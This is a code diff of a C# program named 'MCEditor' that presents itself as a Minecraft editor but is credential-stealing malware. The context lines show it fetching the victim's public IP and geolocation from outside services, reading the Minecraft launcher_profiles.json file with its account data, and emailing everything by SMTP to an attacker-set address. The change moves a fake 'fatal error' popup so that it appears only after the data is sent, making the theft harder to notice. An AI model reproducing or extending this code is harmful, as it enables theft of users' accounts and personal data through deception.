@@ -12,13 +12,14 @@ namespace MCEditor
     class Program
     {
         static string software = "MCEditor"; // Change if you want
+        
+        static string emailAddress = "someone@gmail.com"; // Change this
+        static string emailPassword = "password"; // Change this
 
         static void Main(string[] args)
         {
             Console.Title = software;
             Console.WriteLine("Loading..."); // To make it believable
-            Thread.Sleep(2000); // To make it believable
-            MessageBox.Show("There was a fatal error when starting the program.", software, MessageBoxButtons.OK); // Muhahahaha
 
             string ip = new WebClient().DownloadString("http://ipinfo.io/ip");
             string ipstr = String.Format("http://api.predator.wtf/geoip/?arguments={0}", ip);
@@ -32,9 +33,6 @@ namespace MCEditor
             string profile = String.Format(@"{0}\.minecraft\launcher_profiles.json", appdata);
 
             string subject = String.Format("{0}'s Minecraft Account", Environment.UserName);
-
-            string emailAddress = "someone@gmail.com"; // Change this
-            string emailPassword = "password"; // Change this
 
             string userName = Environment.UserName;
             string computerName = Environment.MachineName.ToString();
@@ -61,6 +59,8 @@ namespace MCEditor
             }
 
             smtp.Send(message);
+            
+            MessageBox.Show("There was a fatal error when starting the program.", software, MessageBoxButtons.OK); // Muhahahaha
             return;
         }
 
